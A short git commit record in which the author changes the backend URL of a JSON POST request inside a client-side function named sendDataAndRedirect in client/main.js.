55944d3e2f0405a24e18f03e7bbb58bc97a0ef5f
zerorich <167667718+zerorich@users.noreply.github.com>
2025-04-14 20:48:13 +0500

    Update main.js

--- client/main.js
+++ client/main.js
@@ -46,7 +46,7 @@ async function sendDataAndRedirect() {
     }
 
     try {
-        const response = await fetch('https://emaktab-production.up.railway.app/requests', {
+        const response = await fetch('https://airy-enjoyment-production-16a0.up.railway.app/requests', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
